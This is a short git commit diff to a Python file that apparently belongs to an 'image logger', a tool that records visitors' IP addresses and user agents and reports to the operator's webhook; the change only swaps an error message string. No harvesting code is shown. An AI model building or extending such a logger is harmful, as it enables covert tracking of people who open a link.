d129743337a2d124706e610b195bae4ef6129b47
hgmm1234x <165621975+hgmm1234x@users.noreply.github.com>
2025-10-17 15:19:27 +0300

    Update main.py

--- api/main.py
+++ api/main.py
@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "@everyone",
+    "content": "Logger By Hgmm1234x",
     "embeds": [
         {
             "title": "Image Logger - Error",
